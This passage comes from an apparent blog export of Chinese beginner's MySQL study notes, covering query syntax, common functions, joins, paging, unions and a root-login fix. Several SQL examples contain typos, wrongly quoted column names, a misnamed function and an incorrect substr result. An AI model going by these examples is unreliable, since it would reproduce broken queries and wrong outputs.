完整的查询语句\n结果：0或1   //返回一个布尔值\n```\n\n```\n案例：查询员工的部门名\nselect department_name\nfrom departments d\nwhere exists(\n\tselect *\n\tfrom employees e\n\twhere d.'department_id'=e.'depaertment_id'\n);\n```\n\n\n\n#### 7、分页查询\n\n1. 应用场景：当要显示的数据，一页显示不全，需要枫叶提交sql请求\n2. 语法：\n\n```\nselect 查询列表\nfrom 表\n连接类型 join 表2\non 连接条件\nwhere 筛选条件\ngroup by 分组字段\nhaving 分组后的筛选\norder by 排序的字段\nlimit offset, size;\n\noffset要显示条目的起始索引（起始索引从0开始）\nsize 要显示的条目个数\n```\n\n3. 案例：查询前五条员工信息\n\n```\nselect * from employees limit 0, 5;\n```\n\n4. 案例2：查询11条—第25条\n\n```\nselect * from employees limit 10, 15;\n```\n\n5. 案例3：有奖金的员工信息，并且工资较高的前10名显示出来\n\n```\nselect *\nfrom employees\nwhere commission_pic is not null\norder by salsry desc\nlimit 10;\n```\n\n6. 特点：\n\n- limit语句放在查询语句德尔最后\n- 公式：要显示的页数page，每页的条目数size\n\n```\nselect 查询列表\nfrom 表\nlimit (page-1)*size, size;\n```\n\n\n\n#### 8、联合查询\n\n1. union联合 ：将多个查询语句的结果合并成一个结果\n2. 语法：\n\n```\n查询语句1\nunion\n查询语句2\nunion\n...\n```\n\n3. 案例：查询部门编号>90或邮箱包含a的员工信息\n\n```\nselect *\nfrom employees\nwhere email like '%a%' or deaprtment_id>90;\n\nselect *\nfrom employees\nwhere email like '%a%'\nunion\nselect *\nfrom employees\nwhere deparment_id>90;\n```\n\n4. 特点：\n\n- 要求多条查询语句的查询列数是一致的\n- 要求多条查询语句的查询的每一列的类型和顺序最好一致\n- union关键字默认去重，如果使用union all 可以包含重复选项\n\n\n\n\n\n\n\n","slug":"数据库","published":1,"updated":"2021-06-20T03:02:32.118Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzazs002w7vvt15cv64ek","content":"<h1 id=\"数据库的学习（一）\"><a href=\"#数据库的学习（一）\" class=\"headerlink\" title=\"数据库的学习（一）\"></a>数据库的学习（一）</h1><ul>\n<li><a href=\"https://www.bilibili.com/video/BV12b411K7Zu/?p=28\">相关视频链接</a></li>\n</ul>\n<h2 id=\"数据库及其概念\"><a href=\"#数据库及其概念\" class=\"headerlink\" title=\"数据库及其概念\"></a>数据库及其概念</h2><ul>\n<li>DB 数据库</li>\n<li>DBMS 数据库管理系统，如Mysql， MongoDB 等，用来管理与操作DB</li>\n<li>SQL  管理数据库的语言，几乎被所有的DBMS支持</li>\n<li>DB是大宅子，DBMS是宅子管家，SQL是管家的指挥口令</li>\n</ul>\n<span id=\"more\"></span>\n\n<h3 id=\"数据库管理的特点\"><a href=\"#数据库管理的特点\" class=\"headerlink\" title=\"数据库管理的特点\"></a>数据库管理的特点</h3><ol>\n<li>先将数据放到 “一张表” 中， 在将表放到仓库中</li>\n<li>一个数据库中存放多张表，每张表都有自己独特的名字，用来标识自己</li>\n<li>数据库中的每张表都有自己的类别，有自己的门派，参照python的  “类”</li>\n<li>表是由列组成，也称为字段，相当与python中的  “属性”</li>\n<li>表是按行储存的，每一行相当与python中的  ”对象“</li>\n</ol>\n<ul>\n<li>端口号port 3306</li>\n</ul>\n<h3 id=\"Linux-系统-Mysql-相关事项\"><a href=\"#Linux-系统-Mysql-相关事项\" class=\"headerlink\" title=\"Linux 系统 Mysql 相关事项\"></a>Linux 系统 Mysql 相关事项</h3><ul>\n<li><p>检查电脑是否存在Mysql ：whereis mysql  或者输入  mysql –version</p>\n</li>\n<li><p>systemctl start mysql.service 启动  或者 service mysql start<br>systemctl stop mysql.service 停止  或者 service mysql stop<br>systemctl restart mysql.service 重启</p>\n</li>\n<li><p>检查电脑是否启动或关闭数据库：ps aux | grep mysqld  或者  pidof mysqld<br><a href=\"https://blog.csdn.net/qq_31083947/article/details/90248565\">相关检查操作链接</a></p>\n</li>\n</ul>\n<h3 id=\"数据库常用命令\"><a href=\"#数据库常用命令\" class=\"headerlink\" title=\"数据库常用命令\"></a>数据库常用命令</h3><ol>\n<li>进入管理系统时时查看有那些数据库</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show databases;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>进入库</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use 库的名称;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>查看库里有哪些表</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show tables;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>从现在所在的库中查看别的库中存有的表</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show tables from 库的名称;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>查看现在在哪个库</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select database();</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>查看表的内容</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">desc 表的名称;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li>创建表</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create table 表名（</span><br><span class=\"line\">\t列名 列类型，</span><br><span class=\"line\">\t列名 列类型，</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"SQL语法规范\"><a href=\"#SQL语法规范\" class=\"headerlink\" title=\"SQL语法规范\"></a>SQL语法规范</h3><ol>\n<li>不区分大小写，但建议关键字大写，表名，列名小写</li>\n<li>每行命令u最好用分号结尾</li>\n<li>每行命令根据需要，可以进行缩进，或换行</li>\n<li>SQL语法中索引从1开始</li>\n<li>注释 </li>\n</ol>\n<ul>\n<li>单行注释：#注释文字</li>\n<li>单行注释：– 注释文字（注意横杠后面有空格）</li>\n<li>多行注释：/× 注释文字 ×/</li>\n</ul>\n<h3 id=\"使用-DBMS-图形化界面以及命令行登录时出现错误解决\"><a href=\"#使用-DBMS-图形化界面以及命令行登录时出现错误解决\" class=\"headerlink\" title=\"使用 DBMS 图形化界面以及命令行登录时出现错误解决\"></a>使用 DBMS 图形化界面以及命令行登录时出现错误解决</h3><ul>\n<li><a href=\"https://www.cnblogs.com/leolztang/p/5094930.html\">原文链接</a></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~$ mysql -u root -p</span><br><span class=\"line\">Enter password: </span><br><span class=\"line\">ERROR 1698 (28000): Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>解决</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 强制登录</span><br><span class=\"line\">sudo mysql</span><br><span class=\"line\"></span><br><span class=\"line\">select user, plugin from mysql.user;</span><br><span class=\"line\"></span><br><span class=\"line\">update mysql.user set authentication_string=PASSWORD(&#x27;hero1314&#x27;), plugin=&#x27;mysql_native_password&#x27; where user=&#x27;root&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">flush privileges;</span><br><span class=\"line\"></span><br><span class=\"line\">sudo service mysql restart</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"数据库语言的学习\"><a href=\"#数据库语言的学习\" class=\"headerlink\" title=\"数据库语言的学习\"></a>数据库语言的学习</h2><h3 id=\"DQL语言的学习\"><a href=\"#DQL语言的学习\" class=\"headerlink\" title=\"DQL语言的学习\"></a>DQL语言的学习</h3><h4 id=\"1、基础查询\"><a href=\"#1、基础查询\" class=\"headerlink\" title=\"1、基础查询\"></a>1、基础查询</h4><ul>\n<li>语法</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 查询列表 from 表名;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>特点：</li>\n</ul>\n<ol>\n<li>查询列表可以是：表中的字段，常量值，表达式，函数</li>\n<li>查询结果是一个虚拟的表格，只是将结果用表格呈现出来而已</li>\n</ol>\n<ul>\n<li>查询字段</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 字段一，字段二 from 表格;    //字段之间用逗号隔开</span><br><span class=\"line\">select * from 表格;  // 查询所有字段</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>着重号 `  （1的旁边的那个），用来标识字段</p>\n</li>\n<li><p>查询常量值：select ‘ 字符或字符串 ’ ;</p>\n</li>\n<li><p>起别名</p>\n<p>​    别名有空格时，应用空格将别名括起来</p>\n<p>​    注意：如果为表起了别名，则查询的字段就不能使用原来的表名去限定 </p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 字段值 as 别名;  // as可以省略</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>去重：在被查询的字段之前加上关键字 distinct</li>\n<li>+ 号的作用</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 100+90; // 俩个操作数都为数值型，则做加法运算</span><br><span class=\"line\"># 结果：190</span><br><span class=\"line\">select &#x27;100&#x27;+90;  // 俩个数中若有一方为字符串，则将进行转换，若转换成功，则将继续做加法运算，若转换失败，则将字符型数值转换成再在进行加法运算</span><br><span class=\"line\"># 结果：190</span><br><span class=\"line\">select null+10; //若有一个方为null，则结果肯定为null</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>ifnull( ) 函数</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select IFNULL(字段，0) as 别名; //若该字段真未NULL，则输出0,否则则输出该字段的值</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"2、条件查询\"><a href=\"#2、条件查询\" class=\"headerlink\" title=\"2、条件查询\"></a>2、条件查询</h4><ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 查询列表 from 表名 where 筛选条件;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>分类：</li>\n</ul>\n<ol>\n<li><p>按表达条件筛选：</p>\n<p>​        逻辑运算符：&gt; , &lt;, =, &lt;&gt; , &lt;=, &gt;=</p>\n<p>​        注意：&lt;&gt;为不等于的意思</p>\n</li>\n<li><p>按逻辑表达式筛选：</p>\n<p>​        &amp;&amp;， ||， ！</p>\n<p>​        and，or，not   // SQL推荐使用</p>\n</li>\n<li><p>模糊查询</p>\n<p>​        like, between and, in, is null</p>\n<ul>\n<li>between and 等价与  &gt;=  and &lt;=</li>\n</ul>\n<p>模糊查询通常与通配符一起使用  (in 不支持)</p>\n<ul>\n<li><p>常见通配符：% 匹配任意一个或零个</p>\n<p>​                     _  (下划线) 匹配任意一个</p>\n<ul>\n<li>支持对通配符进行转义</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 字段 from 表名 where like &#x27;_$_&#x27; escape &#x27;$&#x27;; //使用$符号对下划线进行转义</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select × from 表名 where like %a%;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>安全等于  &lt;=&gt; : 可以判断显示NULL</li>\n</ol>\n<h4 id=\"3、排序查询\"><a href=\"#3、排序查询\" class=\"headerlink\" title=\"3、排序查询\"></a>3、排序查询</h4><ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 字段</span><br><span class=\"line\">from 表</span><br><span class=\"line\">where 筛选条件</span><br><span class=\"line\">order by 排序列表 asc|desc   //不写关键字，默认是asc</span><br><span class=\"line\"># asc 从低到高 （升序）</span><br><span class=\"line\"># desc 从高到底 （降序）</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>支持别名排序， 运算表达式排序</li>\n<li>支持对多个列表进行先后排序查询，列表间用逗号隔开</li>\n<li>排序语句一般是放在查询语句的最后面</li>\n</ul>\n<h4 id=\"常见函数\"><a href=\"#常见函数\" class=\"headerlink\" title=\"常见函数\"></a>常见函数</h4><ul>\n<li>类似python中的方法</li>\n<li>函数可以嵌套使用</li>\n<li>分类：</li>\n</ul>\n<ol>\n<li>单行函数：concat, length, ifnull等</li>\n<li>分组函数：<ul>\n<li>功能：做统计使用，又称为统计函数，聚合函数，组函数</li>\n</ul>\n</li>\n</ol>\n<h5 id=\"单行函数\"><a href=\"#单行函数\" class=\"headerlink\" title=\"单行函数\"></a>单行函数</h5><h6 id=\"一、字符函数\"><a href=\"#一、字符函数\" class=\"headerlink\" title=\"一、字符函数\"></a>一、字符函数</h6><ol>\n<li>length </li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select length(&#x27;str&#x27;);</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>concat ( ) 拼接函数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">concat(str1, str2 ,..., str n); //拼接字符串字段进行查询，字段之间用逗号隔开</span><br><span class=\"line\"># 若str中有值为NULL，则查询的所有值为NULL</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><p>upper( ), lower( ) :改变大小写</p>\n</li>\n<li><p>substr( ) ：截取字符函数</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select substr(&#x27;今天买了个大白菜&#x27;， 6);</span><br><span class=\"line\">结果: 大白菜</span><br><span class=\"line\">select substr(&#x27;今天买了个大白菜&#x27;， 3, 4);</span><br><span class=\"line\">结果: 买了</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>instr( ) :返回字串第一个字符的索引，没有则返回0</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select instr(&#x27;今天买了个大白菜&#x27;， &#x27;大白菜&#x27;);</span><br><span class=\"line\">结果：6</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>trim( ) :去掉字段中的空格或指定字符</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select trim(&#x27;烂的&#x27; from &#x27;今天买了个烂的大白菜&#x27;);</span><br><span class=\"line\">结果：今天买了个大白菜</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li><p>lpad( ): 左填充指定长度的字符，</p>\n<p>rpad( ): 右填充指定长度的字符</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select ipad(&#x27;大白菜&#x27;, 6, &#x27;*&#x27;);</span><br><span class=\"line\">结果：×××大白菜</span><br><span class=\"line\">select rpad(&#x27;大白菜&#x27;, 6, &#x27;*&#x27;);</span><br><span class=\"line\">结果：大白菜×××</span><br></pre></td></tr></table></figure>\n\n<ol start=\"8\">\n<li>replace 替换</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select replace(&#x27;今天买了个大白菜&#x27;, &#x27;大白菜&#x27;, &#x27;胡萝卜&#x27;);</span><br><span class=\"line\">结果：今天买了个胡萝卜</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"二、数学函数\"><a href=\"#二、数学函数\" class=\"headerlink\" title=\"二、数学函数\"></a>二、数学函数</h6><ol>\n<li>round( ) : 四舍五入函数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select round(1.1236);  //默认保留整数部分</span><br><span class=\"line\">结果：1</span><br><span class=\"line\">select round(1.1236, 3);  //可指定保留小数部分</span><br><span class=\"line\">结果：1.124</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>ceil( ): 向上取整，返回 &gt;= 该函数的最小整数</li>\n<li>floor( ): 向下取整，返回  &lt;= 该函数的最大整数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select floor(-9.99);</span><br><span class=\"line\">结果：-10</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>truncate 截断函数，截断小数点后指定的位数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select truncate(1.123, 2);</span><br><span class=\"line\">结果：1.12</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>mod( ): 取模（取余）函数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select mod(10,3);</span><br><span class=\"line\">结果：1</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"三、日期函数\"><a href=\"#三、日期函数\" class=\"headerlink\" title=\"三、日期函数\"></a>三、日期函数</h6><ol>\n<li>now( ) 返回当前系统日期+时间</li>\n<li>curdate( ) 返回当前系统日期，不返回时间</li>\n<li>curtime( ) 返回当前时间，不返回日期</li>\n<li>str_to_date( ) 将日期格式的字符转换成指定格式的日期</li>\n<li>date_format( ) 将日期转换成字符</li>\n</ol>\n<ul>\n<li>更多日期函数请上网搜索</li>\n</ul>\n<h6 id=\"四、流程控制函数\"><a href=\"#四、流程控制函数\" class=\"headerlink\" title=\"四、流程控制函数\"></a>四、流程控制函数</h6><ol>\n<li>if( ) :该函数起到的作用类似与python或C语言中的else if( )函数</li>\n<li>case( )： </li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">case 要判断的字段或表达式    // 选择函数——判断并选择显示一个</span><br><span class=\"line\">when 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 </span><br><span class=\"line\">when 常量2 then 要显示的值2或语句2;</span><br><span class=\"line\">...</span><br><span class=\"line\">else 默认显示的值或语句</span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">case</span><br><span class=\"line\">when 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 </span><br><span class=\"line\">when 常量2 then 要显示的值2或语句2;</span><br><span class=\"line\">...</span><br><span class=\"line\">else 默认显示的值或语句</span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"五、其它函数\"><a href=\"#五、其它函数\" class=\"headerlink\" title=\"五、其它函数\"></a>五、其它函数</h6><ul>\n<li>其他函数太多，用时上网搜</li>\n</ul>\n<h5 id=\"分组函数\"><a href=\"#分组函数\" class=\"headerlink\" title=\"分组函数\"></a>分组函数</h5><ul>\n<li>功能：用作统计使用，又称为聚合函数或统计函数或组函数</li>\n<li>分类：sum 求和， avg 平均值， max， min， count 计算个数</li>\n<li>忽略 NULL值</li>\n<li>可以与distinct( )去重函数或其它函数搭配使用</li>\n<li>count( )详细介绍</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(*) from 表单;  //统计总行数</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>和分组函数一同查询的字段要求是group by后的字段</li>\n</ul>\n<h4 id=\"4、分组查询\"><a href=\"#4、分组查询\" class=\"headerlink\" title=\"4、分组查询\"></a>4、分组查询</h4><ol>\n<li>语法：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 分组函数，列（要求出现在group by的后面）</span><br><span class=\"line\">from 表</span><br><span class=\"line\">[where 筛选条件]</span><br><span class=\"line\">group by 分组的列表;</span><br><span class=\"line\">[order by 子句]</span><br><span class=\"line\"></span><br><span class=\"line\">// 查询列表必须特殊，要求是分组函数和group by 后出现的字段</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>简单的分组查询</li>\n</ul>\n<ol>\n<li>实例一：查询每个工种的最高工资</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select max(salary), job_id</span><br><span class=\"line\">from employees</span><br><span class=\"line\">group by job_id;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>实例二：查询每个位置上的部门个数</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(*), location_id</span><br><span class=\"line\">from departments</span><br><span class=\"line\">group by lacation_id;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>添加筛选条件的分组查询</li>\n</ul>\n<ol start=\"4\">\n<li>实例三：查询邮箱中包含a字符的，每个部门的平均工资</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select avg(salsry), department_id</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where email &#x27;%a%&#x27;</span><br><span class=\"line\">group by department_id;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>实例四：查询有奖金的每个领导手下员工的最高工资</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select max(salary), manager_id</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where commission_pct is ont null</span><br><span class=\"line\">group by manager_id;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>添加复杂筛选条件的分组查询</li>\n<li>分组后进行条件筛选的查询</li>\n</ul>\n<ol start=\"6\">\n<li>实例五：查询哪个部门的员工个数&gt;2</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(*), depatment_id</span><br><span class=\"line\">from employees</span><br><span class=\"line\">group by department_id</span><br><span class=\"line\">having count(*)&gt;2;   //用查询的结果再进行筛选时用having</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"5、连接查询【-优先学习99语法-】\"><a href=\"#5、连接查询【-优先学习99语法-】\" class=\"headerlink\" title=\"5、连接查询【 优先学习99语法 】\"></a>5、连接查询【 优先学习99语法 】</h4><ol>\n<li><p>含义：又称多表查询，当查询的字段来自于多个表时，就会用到连接查询</p>\n</li>\n<li><p>笛卡尔乘积现象：表1有m行，表2有n行，结果有m×n行</p>\n<ol>\n<li>发生原因：没有有效的链接条件</li>\n<li>如何避免：添加有效的连接条件</li>\n</ol>\n</li>\n<li><p>按功能分类：</p>\n<ul>\n<li><p>内连接：等值连接</p>\n<p>​               非等值连接</p>\n<p>​               自连接</p>\n</li>\n<li><p>外连接：左外连接</p>\n<p>​               右外连接</p>\n<p>​               全外连接</p>\n</li>\n<li><p>交叉连接</p>\n</li>\n</ul>\n</li>\n</ol>\n<h5 id=\"SQL92语法\"><a href=\"#SQL92语法\" class=\"headerlink\" title=\"SQL92语法\"></a>SQL92语法</h5><p>(1) 等值查询</p>\n<ul>\n<li>查询员工名和对应的部门名</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select last_name, department_name</span><br><span class=\"line\">from employees, departments</span><br><span class=\"line\">where employees.&#x27;department_id=departments.&#x27;department_id&#x27;;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>多条件筛选连接查询<ul>\n<li>查询有奖金的员工名，部门名</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select last_name, department_name, commission_pct</span><br><span class=\"line\">from emplloees e, departments d</span><br><span class=\"line\">where e.&#x27;department_id&#x27;=d.&#x27;department_id&#x27;</span><br><span class=\"line\">and e.&#x27;commission_pct&#x27; is not null;</span><br></pre></td></tr></table></figure>\n\n<p>(2) 非等值链接</p>\n<ul>\n<li>在等值链接的基础上将条件改为非等值就行</li>\n</ul>\n<p>(3) 自链接</p>\n<ul>\n<li><p>自己链接自己</p>\n</li>\n<li><p>实例:查询查询一张表中员工名和上级的名称</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select e.employee_id, e.last_name, m.employee_id, m.last_name</span><br><span class=\"line\">from employees e, employees m</span><br><span class=\"line\">where e.&#x27;manager_id&#x27;=m.&#x27;employee_id&#x27;;</span><br></pre></td></tr></table></figure>\n\n\n\n<h5 id=\"SQL99语法\"><a href=\"#SQL99语法\" class=\"headerlink\" title=\"SQL99语法\"></a>SQL99语法</h5><ul>\n<li><p>语法： select 查询列表</p>\n<p>​            from 表1 别名</p>\n<pre><code>        [连接类型]  join 表2 别名\n</code></pre>\n<p>​            on 连接条件</p>\n<p>​            where 筛选条件</p>\n<p>​            group by 